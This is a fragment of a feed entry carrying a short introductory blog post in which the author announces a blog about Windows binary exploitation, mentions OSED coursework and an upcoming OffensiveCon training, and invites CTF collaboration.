+&lt;p&gt;I …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hello ppl,&lt;/p&gt;
+&lt;p&gt;this will be my blog, where I write about binary exploitation.
+I will focus on Windows mostly, at least till end of 2025.&lt;/p&gt;
+&lt;p&gt;Currently I work on finishing Offensive Security's OSED Course (EXP-301) and
+will have the Windows Internals Training at OffensiveCon in the mid of May.&lt;/p&gt;
+&lt;p&gt;I will create a companion GitHub repository where I will store all the tools and knowledge related to the latest techniques I learn and tools I use.&lt;/p&gt;
+&lt;p&gt;Else feel free to contact me, to join forces in CTF's or in binary pwning or when u have tips for me =)&lt;/p&gt;
+&lt;p&gt;Happy Hacking&lt;/p&gt;</content><category term="Misc"></category><category term="None"></category></entry></feed>
